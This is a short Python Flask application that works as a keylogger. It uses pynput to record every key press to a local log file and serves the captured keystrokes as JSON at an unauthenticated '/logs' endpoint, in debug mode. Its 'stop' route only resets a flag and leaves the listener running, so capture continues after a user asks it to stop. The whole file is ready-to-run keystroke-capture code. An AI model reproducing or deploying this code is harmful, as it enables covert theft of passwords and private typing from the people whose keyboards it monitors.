import os
import logging
from pynput.keyboard import Listener
from flask import Flask, render_template, jsonify

app = Flask(__name__)

# Configure a dedicated keylogger logger
logger = logging.getLogger("keylogger")
logger.setLevel(logging.DEBUG)
log_dir = "./KeyLogger/logs/"
os.makedirs(log_dir, exist_ok=True)
# Set up a file handler for the keylogger
log_file = os.path.join(log_dir, "keylog.txt")
file_handler = logging.FileHandler(log_file)
file_handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s'))
logger.addHandler(file_handler)

log_file = os.path.join(log_dir, "keylog.txt")
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

keylogger_active = False

# Keylogger functions
def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"{key}")

def start_keylogger():
    global keylogger_active
    if not keylogger_active:
        keylogger_active = True
        # Clear the log file
        open(log_file, 'w').close()
        listener = Listener(on_press=on_press)
        listener.start()

@app.route('/')
def index():
    return render_template('keylogger.html')

@app.route('/start', methods=['POST'])
def start():
    if not keylogger_active:
        start_keylogger()
        return jsonify({"status": "Keylogger started."})
    else:
        return jsonify({"status": "Keylogger is already running."})

@app.route('/stop', methods=['POST'])
def stop():
    global keylogger_active
    if keylogger_active:
        keylogger_active = False
        return jsonify({"status": "Keylogger stopped."})
    else:
        return jsonify({"status": "Keylogger is not running."})

@app.route('/logs', methods=['GET'])
def get_logs():
    if os.path.exists(log_file):
        with open(log_file, 'r') as file:
            logs = file.read()
        return jsonify({"logs": logs})
    else:
        return jsonify({"logs": "No logs found."})

if __name__ == '__main__':
    app.run(debug=True, port=8080)
